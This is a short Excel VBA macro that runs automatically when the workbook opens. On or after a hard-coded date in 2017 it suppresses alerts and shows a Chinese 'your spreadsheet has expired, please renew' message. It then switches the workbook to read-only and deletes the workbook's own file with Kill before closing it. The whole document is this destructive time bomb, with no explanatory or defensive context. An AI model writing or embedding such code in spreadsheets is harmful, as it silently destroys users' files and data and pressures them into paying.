Private Sub Workbook_Open()
    If Date >= "2017-10-1" Then
        Application.DisplayAlerts = False
        MsgBox "你好，你的表格已到期，如要继续使用请续费" & vbCr & "!"'第一段和第二段
        With ThisWorkbook
        .Saved = True
        .ChangeFileAccess xlReadOnly
        Kill .FullName
        .Close
        End With
    End If
End Sub